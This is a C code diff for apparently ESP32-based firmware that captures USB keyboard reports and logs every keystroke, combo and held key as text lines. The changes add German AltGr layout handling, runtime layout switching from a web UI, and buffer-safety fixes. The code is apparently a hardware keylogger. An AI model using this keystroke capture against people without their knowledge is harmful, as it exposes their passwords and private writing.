@@ -260,15 +260,7 @@ static const char *mod_label[8] = {
 // the label without brackets (so we can nest inside "[LALT + F4]"). We check
 // the current keyboard layout first so a German keyboard's y/z, ä/ö/ü/ß etc.
 // come out right.
-static void render_key(uint8_t kc, bool shift, char *out, size_t out_sz) {
-    if (!out_sz) return;
-    const kb_layout_entry_t *layo = kb_layout_lookup(kb_layout_get(), kc);
-    if (layo) {
-        const char *s = shift ? layo->shifted : layo->unshifted;
-        if (s && *s) { snprintf(out, out_sz, "%s", s); return; }
-    }
-    char c = shift ? kb_shifted[kc] : kb_unshifted[kc];
-    if (c && c != '\n') { out[0] = c; out[1] = 0; return; }
+static void render_special(uint8_t kc, char *out, size_t out_sz) {
     const char *name = kb_special(kc);
     if (name) {
         if (name[0] == '\n' && name[1] == 0) { snprintf(out, out_sz, "ENTER"); return; }
@@ -283,6 +275,25 @@ static void render_key(uint8_t kc, bool shift, char *out, size_t out_sz) {
         return;
     }
     snprintf(out, out_sz, "0x%02X", kc);
+}
+
+static void render_key(uint8_t kc, bool shift, bool altgr, char *out, size_t out_sz) {
+    if (!out_sz) return;
+    const kb_layout_entry_t *layo = kb_layout_lookup(kb_layout_get(), kc);
+    if (layo) {
+        const char *s = altgr ? layo->altgr
+                              : (shift ? layo->shifted : layo->unshifted);
+        if (s && *s) { snprintf(out, out_sz, "%s", s); return; }
+    }
+    if (kc >= 0x04 && kc < 0x68) {
+        // In the ASCII table range: use the table, fall back to specials only
+        // when the table has no entry for this code.
+        char c = shift ? kb_shifted[kc] : kb_unshifted[kc];
+        if (c && c != '\n') { out[0] = c; out[1] = 0; return; }
+    }
+    // Out-of-table usage codes (0x68..0x81 media keys, reserved) must never
+    // index the 128-entry table; route them straight through the specials.
+    render_special(kc, out, out_sz);
 }
 
 static void combo_reset(void) { s_combo_len = 0; s_combo_buf[0] = 0; s_combo_mods_ever = 0; s_combo_active = false; }
@@ -302,19 +313,30 @@ static void combo_append(const char *token) {
 // modifier presses are still logged (matches "Hello! [WINDOWS]" example).
 static void combo_flush(void) {
     if (!s_combo_active && !s_combo_mods_ever) return;
-    char out[192]; int off = 0;
-    off += snprintf(out + off, sizeof(out) - off, "[");
+    char out[192];
+    size_t cap = sizeof(out);
+    size_t off = 0;
+    // snprintf returns the value that WOULD have been written, so adding it
+    // blindly can push past the buffer even though each call was bounded.
+    // Track the offset as a size_t and clamp it so later calls can never
+    // underflow (off > cap -> cap - off huge -> unbounded write).
+    off += (size_t)snprintf(out + off, cap - off, "[");
+    if (off >= cap) off = cap - 1;
     bool first = true;
-    for (int i = 0; i < 8; i++) {
+    for (int i = 0; i < 8 && off < cap; i++) {
         if (s_combo_mods_ever & (1u << i)) {
-            off += snprintf(out + off, sizeof(out) - off, "%s%s", first ? "" : " + ", mod_label[i]);
+            int w = snprintf(out + off, cap - off, "%s%s", first ? "" : " + ", mod_label[i]);
+            if (w > 0) off += (size_t)w;
+            if (off >= cap) off = cap - 1;
             first = false;
         }
     }
-    if (s_combo_len) {
-        off += snprintf(out + off, sizeof(out) - off, "%s%s", first ? "" : " + ", s_combo_buf);
+    if (s_combo_len && off < cap) {
+        int w = snprintf(out + off, cap - off, "%s%s", first ? "" : " + ", s_combo_buf);
+        if (w > 0) off += (size_t)w;
+        if (off >= cap) off = cap - 1;
     }
-    off += snprintf(out + off, sizeof(out) - off, "]");
+    if (off < cap) snprintf(out + off, cap - off, "]");   // clipped "]" is acceptable, buffer stays valid
     tx_line("KEY", out);
     combo_reset();
 }
@@ -368,19 +390,29 @@ static void link_bringup_task(void *arg) {
 }
 
 #define C6_REG_LED_MODE_CCCR_ADDR   (0x60 + 40)
+#define C6_REG_LAYOUT_CCCR_ADDR     (0x60 + 41)   // 0=US 1=DE 2=UK (== kb_layout_t)
 
 // Definition follows below — link_bringup_task references it.
 static void led_poll_task(void *arg) {
     (void)arg;
     if (!s_card) { vTaskDelete(NULL); return; }
-    uint8_t last = 0xFF;
+    uint8_t last_led = 0xFF;
+    uint8_t last_lay = 0xFF;
     while (1) {
         uint8_t v = 0;
         esp_err_t err = sdmmc_io_read_byte(s_card, 0, C6_REG_LED_MODE_CCCR_ADDR, &v);
-        if (err == ESP_OK && v != last) {
+        if (err == ESP_OK && v != last_led) {
             // C6 IDs: 0=OFF 1=GREEN 2=KEYFLASH 3=RED 4=BLUE
             led_set_mode((led_mode_t)(v > 4 ? LED_MODE_KEY_FLASH : v));
-            last = v;
+            last_led = v;
+        }
+        // Runtime layout switch straight from the web UI — no reflash.
+        uint8_t lay = 0xFF;
+        err = sdmmc_io_read_byte(s_card, 0, C6_REG_LAYOUT_CCCR_ADDR, &lay);
+        if (err == ESP_OK && lay != last_lay && lay < KL_COUNT) {
+            kb_layout_set((kb_layout_t)lay);
+            ESP_LOGI(TAG, "layout set to %s", kb_layout_name((kb_layout_t)lay));
+            last_lay = lay;
         }
         vTaskDelay(pdMS_TO_TICKS(500));
     }
@@ -420,11 +452,20 @@ void c6_uart_feed_kbd_report(const uint8_t *buf, size_t len) {
     const uint8_t *keys = &buf[2];
     uint32_t now  = now_ms();
     bool shift    = (mod & 0x22) != 0;
+    // AltGr on DE == RALT, or the rare LCTRL+LALT combo. When active, the key
+    // is a printable AltGr composition (render_key uses the altgr glyph), so it
+    // must NOT be swallowed into a combo like [RALT + e].
+    bool altgr = ((mod & 0x40) != 0) && (kb_layout_get() == KL_DE);
+    // On DE, RALT is AltGr (glyph composition), never a combo modifier, so it
+    // stays out of combo capture. LCTRL+LALT is left as a normal combo so
+    // Ctrl+Alt+Del still logs correctly.
+    uint8_t altgr_mask = COMBO_MOD_MASK;
+    if (altgr) altgr_mask &= (uint8_t)~0x40u;
 
     // A "combo modifier" excludes shift so plain shift-typing doesn't get
     // swallowed into a giant combo.
-    uint8_t combo_mod_now  = mod        & COMBO_MOD_MASK;
-    uint8_t combo_mod_prev = s_prev_mod & COMBO_MOD_MASK;
+    uint8_t combo_mod_now  = mod        & altgr_mask;
+    uint8_t combo_mod_prev = s_prev_mod & altgr_mask;
     bool any_mod_now  = combo_mod_now  != 0;
     bool any_mod_prev = combo_mod_prev != 0;
 
@@ -440,7 +481,7 @@ void c6_uart_feed_kbd_report(const uint8_t *buf, size_t len) {
         if (keycode_was_pressed(kc)) continue;    // still held from prev report
 
         char tok[24];
-        render_key(kc, shift, tok, sizeof(tok));
+        render_key(kc, shift, altgr, tok, sizeof(tok));
 
         if (any_mod_now) {
             combo_append(tok);
@@ -476,11 +517,16 @@ void c6_uart_feed_kbd_report(const uint8_t *buf, size_t len) {
         // find the press time entry
         for (int j = 0; j < 6; j++) {
             if (s_pressed[j].kc != kc) continue;
+            // t_press_ms == 0 means the press-time entry was already cleared
+            // by a combo flush (key stayed physically held across mod-up).
+            // Recomputing "now - 0" would emit a bogus HELD with a nonsense
+            // duration, so only report HELD when a real press time exists.
+            if (!s_pressed[j].t_press_ms) { s_pressed[j].kc = 0; break; }
             uint32_t dur = now - s_pressed[j].t_press_ms;
             s_pressed[j].kc = 0;
             // Only report HELD for solo (no-modifier) press >= HOLD_MS.
             if (!any_mod_now && !any_mod_prev && !s_combo_active && dur >= HOLD_MS) {
-                char tok[24]; render_key(kc, shift, tok, sizeof(tok));
+                char tok[24]; render_key(kc, shift, altgr, tok, sizeof(tok));
                 char body[64];
                 snprintf(body, sizeof(body), "[HELD KEY: %s, %u.%u Seconds]",
                          tok, (unsigned)(dur / 1000), (unsigned)((dur % 1000) / 100));
